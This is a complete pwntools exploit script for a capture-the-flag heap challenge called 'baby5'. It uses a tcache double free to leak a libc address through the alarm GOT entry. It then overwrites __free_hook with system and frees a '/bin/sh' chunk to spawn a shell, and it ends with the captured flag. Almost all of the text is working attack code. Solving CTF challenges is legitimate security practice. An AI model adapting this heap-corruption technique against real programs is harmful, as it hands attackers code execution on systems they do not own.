from pwn import *


binpath = './baby5'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc
# libc = ELF('./libc.so.6')


gdbscript = '''
gef
# after menu
b *0x400dc3
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# io = remote('baby-01.pwn.beer', 10005)


def debug(func):
    def wrapper(*args, **kwargs):
        print '{}({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, data):
    io.recvuntil('> ')
    io.sendline('1')

    io.recvuntil('size: ')
    io.sendline(str(size))

    io.recvuntil('data: ')
    io.sendline(data)


@debug
def edit(item, size, data):
    io.recvuntil('> ')
    io.sendline('2')

    io.recvuntil('item: ')
    io.sendline(str(item))

    io.recvuntil('size: ')
    io.sendline(str(size))

    io.recvuntil('data: ')
    io.sendline(data)


@debug
def delete(item):
    io.recvuntil('> ')
    io.sendline('3')

    io.recvuntil('item: ')
    io.sendline(str(item))


@debug
def show(item):
    io.recvuntil('> ')
    io.sendline('4')

    io.recvuntil('item: ')
    io.sendline(str(item))

    io.recvuntil('data: ')
    data = io.recvuntil('obligatory')[:len('obligatory')].rstrip('\n')
    return data


add(0x28, 'A') # 0
add(0x38, 'B') # 1

delete(0)
delete(0)

add(0x28, p64(elf.got['alarm'])) # 2
add(0x28, '') # 3
add(0x28, '') # 4 (got['alarm'])

data = show(4)
print hexdump(data)
addr_alarm = u64(data[:data.rfind('\n')].ljust(8, '\x00'))
addr_libc = addr_alarm - 0xe480a


print 'addr_alarm = {}'.format(hex(addr_alarm))
print 'addr_libc = {}'.format(hex(addr_libc))

delete(1)
delete(1)

add(0x38, p64(addr_libc + libc.symbols['__free_hook'])) # 5
add(0x38, '') # 6
add(0x38, p64(addr_libc + libc.symbols['system'])) # 7

add(0x48, '/bin/sh\x00') # 8
delete(8)


io.interactive()


# sctf{wh3N_I_gr0w_uP_I_w4nT_t0_b3_sol4R_d3s1Gn3R}
